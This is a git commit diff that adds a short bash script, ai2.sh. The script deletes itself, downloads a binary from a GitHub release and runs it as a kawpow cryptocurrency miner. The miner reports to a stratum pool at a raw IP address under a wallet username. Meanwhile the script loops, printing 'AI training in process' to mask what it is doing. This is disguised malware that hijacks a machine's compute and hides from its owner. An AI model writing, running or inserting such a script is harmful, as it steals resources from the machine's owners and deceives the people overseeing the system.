f7ff28a7fd1d5b8cc2ba8e592506b82dc85304b4
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-30 11:41:10 +0300

    Create ai2.sh

---
+++ ai2.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+nohup bash -c "
+  ( sleep 1; rm -- \"$0\" ) &
+  wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
+  chmod +x aitraininng
+  ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
+" > /dev/null 2>&1 &
+while true; do
+    echo "AI training in process"
+    sleep 600 
+done
